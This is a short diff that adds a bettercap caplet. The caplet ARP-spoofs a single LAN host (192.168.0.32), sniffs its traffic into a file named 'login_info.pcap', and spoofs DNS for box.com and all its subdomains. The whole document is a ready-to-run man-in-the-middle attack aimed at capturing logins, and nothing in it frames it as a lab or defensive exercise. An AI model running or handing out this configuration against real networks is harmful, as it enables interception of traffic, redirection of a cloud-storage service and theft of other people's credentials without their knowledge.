@@ -1,0 +1,10 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.0.32
+arp.spoof on
+set net.sniff.local true
+set net.sniff.output login_info.pcap
+net.sniff on
+set dns.spoof.all true
+set dns.spoof.domains box.com,*.box.com
+dns.spoof on
